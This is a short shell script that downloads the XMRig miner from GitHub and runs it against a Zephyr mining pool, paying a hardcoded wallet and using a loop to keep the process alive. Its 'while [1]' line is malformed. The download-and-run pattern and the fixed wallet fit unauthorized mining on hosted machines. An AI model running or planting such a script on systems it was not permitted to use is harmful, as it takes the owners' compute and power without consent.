#!/bin/sh

# Generate random string for password
password=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8 ; echo '')

apt update
wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz
tar -xzvf xmrig-6.21.1-linux-x64.tar.gz
cd xmrig-6.21.1
./xmrig -o sg-zephyr.miningocean.org:5332 -u ZEPHs9WzG2A6HASnGEA6xRcM7zq9fpX8TJa1azAB23GNffk7tPsguMyCefuPTN14FGK9mREnmPsdT7yC9KFpMfgUVHmZqAzQY7V -p $password -a rx/0 -k --donate-level 1
while [1]; do
sleep 3
done
sleep 999
